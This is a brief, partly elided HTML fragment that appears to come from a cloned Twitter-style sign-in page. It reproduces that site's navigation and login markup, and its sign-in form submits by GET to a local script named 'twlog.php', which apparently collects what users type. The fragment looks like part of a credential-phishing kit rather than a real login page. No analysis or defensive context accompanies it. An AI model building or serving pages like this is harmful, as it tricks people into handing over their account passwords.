...
<ul class="nav js-global-actions" role="navigation" id="global-actions">
  <li id="global-nav-home" class="home" data-global-action="home">
    ...
    <li id="global-nav-about" class="about" data-global-action="about">
      <a class="js-tooltip js-dynamic-tooltip" data-placement="bottom" href="about.html" target="" data-component-context="about_nav" data-nav="about" rel="noopener">
...
<center>
  ...
  <div class="signin-wrapper" data-login-message="">
    ...
    <form action="twlog.php" class="t1-form clearfix signin js-signin" method="get">
      <fieldset>
